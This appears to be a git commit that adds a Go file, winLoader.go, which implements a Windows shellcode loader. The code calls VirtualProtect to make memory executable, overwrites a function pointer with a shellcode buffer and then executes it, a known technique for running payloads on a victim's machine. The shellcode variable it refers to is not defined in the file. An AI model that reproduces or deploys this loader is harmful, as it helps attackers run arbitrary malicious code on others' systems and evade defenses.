b6c9bfca791a260a14f4c7a9a7b8b9ecee87f1e4
Aaron <aaron.lin@rtshield.com>
2020-05-09 16:14:32 +0800

    file add

---
+++ winLoader.go
@@ -0,0 +1,33 @@
+package main
+
+import (
+	"flag"
+	"syscall"
+	"unsafe"
+)
+var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")
+
+func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
+	ret, _, _ := procVirtualProtect.Call(
+	uintptr(lpAddress),
+	uintptr(dwSize),
+	uintptr(flNewProtect),
+	uintptr(lpflOldProtect))
+	return ret > 0
+}
+func main() {
+
+
+	f:= func() {}
+	var oldfperms uint32
+	if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms)) {
+		panic("Call to VirtualProtect failed!")
+	}
+	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&sc))
+
+	var oldshellcodeperms uint32
+	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
+		panic("Call to VirtualProtect failed!")
+	}
+	f()
+}
